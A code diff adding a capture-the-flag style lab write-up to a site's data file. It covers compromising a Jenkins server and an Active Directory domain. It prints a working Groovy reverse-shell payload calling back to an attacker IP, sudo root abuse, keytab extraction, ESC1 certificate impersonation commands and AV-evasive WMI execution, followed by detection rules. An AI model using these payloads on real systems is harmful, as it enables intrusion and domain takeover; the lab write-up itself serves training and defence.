@@ -316,6 +316,128 @@ const PROJECTS = [
                 author, summary, tags[], link ({title,url} or null), body (HTML) } */
 const WRITEUPS = [
   {
+    id: "anomaly",
+    title: "Anomaly: Jenkins to Domain Admin via ESC1",
+    date: "2026-06-26",
+    platform: "Hack Smarter Labs",
+    difficulty: "Medium",
+    author: "0xz3r0",
+    summary: "Default Jenkins credentials lead to a reverse shell on a web server, a privileged router configuration binary hands over root, and a Kerberos keytab pivot enables an ADCS ESC1 attack for Domain Admin on the DC.",
+    tags: ["Jenkins", "Linux", "PrivEsc", "Kerberos", "ADCS", "ESC1", "AV Evasion"],
+    link: { title: "Hack Smarter Labs: Anomaly", url: "https://www.hacksmarter.org/" },
+    body: `
+      <h2>Overview</h2>
+      <p>Anomaly is a two-host Active Directory lab. The external web server and the domain controller sit on separate subnets, requiring a pivot after the initial foothold. The path starts with default Jenkins credentials, escalates to root on the web server, extracts a Kerberos keytab, moves laterally to the DC, and abuses an ADCS ESC1 misconfiguration to achieve Domain Admin.</p>
+
+      <h2>Recon</h2>
+      <p>Scanning the web server reveals only two exposed services: SSH on port 22 and Jetty on port 8080.</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">rustscan -a 10.1.67.252 -- -A</code></pre>
+      </div>
+      <p>Port 8080 hosts a Jenkins instance. The target's internal DC (<code>10.1.130.2</code>) has SMB exposed but blocks null authentication enumeration.</p>
+
+      <h2>Initial Access</h2>
+      <p>Attempting default credentials against the Jenkins login portal yields immediate success with <code>admin:admin</code>.</p>
+      <figure>
+        <img src="images/anomaly-jenkins-login.png" alt="Jenkins login portal">
+        <figcaption>Figure 1: Jenkins login portal.</figcaption>
+      </figure>
+      <p>With administrative access to Jenkins, the Script Console provides arbitrary Groovy execution. I used a standard reverse shell payload to catch a callback on the host.</p>
+      <div class="code-wrap">
+        <pre><code class="language-java">String host="10.200.67.140";
+int port=4444;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+  while(pi.available()>0)so.write(pi.read());
+  while(pe.available()>0)so.write(pe.read());
+  while(si.available()>0)po.write(si.read());
+  so.flush();po.flush();
+  Thread.sleep(50);
+  try {p.exitValue();break;}catch (Exception e){}
+};
+p.destroy();s.close();</code></pre>
+      </div>
+      <figure>
+        <img src="images/anomaly-jenkins-shell.png" alt="Jenkins Script Console execution">
+        <figcaption>Figure 2: Script Console execution as the Jenkins service account.</figcaption>
+      </figure>
+      <p>The callback returns a shell as the <code>jenkins</code> user.</p>
+
+      <h2>Privilege Escalation</h2>
+      <p>Enumerating the local user's sudo permissions reveals a custom utility allowed to run without a password:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">sudo -l</code></pre>
+      </div>
+      <figure>
+        <img src="images/anomaly-sudo-l.png" alt="Sudo permissions for the jenkins user">
+        <figcaption>Figure 3: <code>sudo -l</code> output showing the NOPASSWD entry.</figcaption>
+      </figure>
+      <p>The <code>router_config</code> binary passes its argument to a shell without sanitization. Invoking it with an interactive shell binary provides root access:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">sudo /usr/bin/router_config /bin/sh</code></pre>
+      </div>
+      <figure>
+        <img src="images/anomaly-router-config-root.png" alt="Root shell obtained via router_config">
+        <figcaption>Figure 4: Abusing <code>router_config</code> for a root shell.</figcaption>
+      </figure>
+
+      <h2>Enumeration</h2>
+      <p>With root access on the web server, I established persistence via an SSH key, then began searching for paths to the domain controller. Reading the Kerberos configuration and checking for keytab files yielded <code>/etc/krb5.keytab</code>.</p>
+      <p>Using KeyTabExtract, I pulled an AES-256 hash for the service principal <code>Brandon_Boyd</code>. Importing this into a credential cache allowed authentication to the DC over LDAP.</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">python3 keytabextract.py krb5.keytab
+nxc ldap anomaly.hsm -u brandon_boyd -k --use-kcache --users</code></pre>
+      </div>
+      <p>Dumping the LDAP users revealed a critical misconfiguration: the password for <code>Brandon_Boyd</code> was stored in cleartext in the Description field. Validating this password over SMB provided authenticated access to the domain.</p>
+
+      <h2>Domain Admin</h2>
+      <p>BloodHound collection from the authenticated context showed no direct path to Domain Admin. However, certipy-ad enumerated Active Directory Certificate Services (ADCS) and identified a vulnerable template named <code>CertAdmin</code>.</p>
+      <p>The template is vulnerable to ESC1 (Enrollee supplies subject and allows client authentication) and ESC4 (dangerous ACL permissions). Because <code>Domain Computers</code> have enrollment rights, I created a new machine account and requested a certificate impersonating the Domain Admin user <code>Anna_Molly</code>.</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">impacket-addcomputer 'anomaly.hacksmarter/brandon_boyd:&lt;PASSWORD&gt;' -dc-ip 10.1.130.2 -computer-name 'zero' -computer-pass '&lt;NEW_PASSWORD&gt;'
+certipy-ad req -u 'zero$' -p '&lt;NEW_PASSWORD&gt;' -dc-ip 10.1.130.2 -target 'anomaly.hsm' -ca 'anomaly-ANOMALY-DC-CA-2' -template 'CertAdmin' -upn 'Anna_Molly@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105'</code></pre>
+      </div>
+      <p>Authenticating with the resulting PFX file returned the NT hash for <code>Anna_Molly</code>. Standard Impacket tools like <code>psexec</code> and <code>wmiexec</code> were blocked by the endpoint AV. Using an obfuscated WMI execution wrapper (WMIExec2) bypassed the signature detection and provided a shell as Domain Admin.</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">certipy-ad auth -pfx 'anna_molly.pfx' -dc-ip 10.1.130.2
+python3 wmiexec2.py 'anomaly.hsm/anna_molly'@anomaly.hsm -hashes '&lt;NT_hash&gt;' -shell-type powershell</code></pre>
+      </div>
+      <p>The final flag was located on the Administrator desktop.</p>
+
+      <h2>Tools</h2>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
+          <tbody>
+            <tr><td>RustScan / Nmap</td><td>Port and service discovery</td></tr>
+            <tr><td>Jenkins Script Console</td><td>Groovy reverse shell execution</td></tr>
+            <tr><td>KeyTabExtract</td><td>Extract AES keys from krb5.keytab</td></tr>
+            <tr><td>NetExec</td><td>LDAP enumeration and SMB validation</td></tr>
+            <tr><td>Certipy-ad</td><td>ADCS enumeration and ESC1 exploitation</td></tr>
+            <tr><td>Impacket</td><td>addcomputer and credential extraction</td></tr>
+            <tr><td>WMIExec2</td><td>AV-evasive remote execution</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h2>Detection Rules</h2>
+      <ul>
+        <li>Jenkins authentication with default credentials (<code>admin:admin</code>). Monitor CI/CD logs for successful logins originating from unusual IPs.</li>
+        <li>Execution of <code>/bin/bash</code> or <code>/bin/sh</code> as a child process of the Jenkins Java process.</li>
+        <li>Use of <code>sudo</code> against custom binaries (like <code>router_config</code>) that spawn shells. Monitor command-line arguments passed to NOPASSWD utilities.</li>
+        <li>Reading <code>/etc/krb5.keytab</code> or <code>/etc/shadow</code> by the Jenkins service account.</li>
+        <li>LDAP attributes containing passwords. Alert on any Description fields matching common password patterns.</li>
+        <li>Creation of computer accounts by non-machine users (e.g., <code>Brandon_Boyd</code> creating <code>zero$</code>).</li>
+        <li>ADCS certificate requests where the UPN does not match the requesting account (ESC1).</li>
+        <li>Remote WMI execution spawning PowerShell from a Domain Admin context.</li>
+      </ul>
+    `
+  },
+  {
     id: "sharethepain",
     title: "ShareThePain: Writable Share to Domain Controller",
     date: "2026-06-13",
@@ -619,7 +741,7 @@ reg save hklm\\system C:\\Users\\h.grangon\\Desktop\\system</code></pre>
         <li>Pass-the-hash: a logon with an NT hash rather than a password leaves an NTLM authentication event without a matching <code>4768</code> or <code>4769</code> Kerberos request for the same account in the expected window.</li>
       </ul>
     `
-  },
+  }
 ];
 
 /* Research posts: { id, title, date, author, summary, tags[], body (HTML) } */
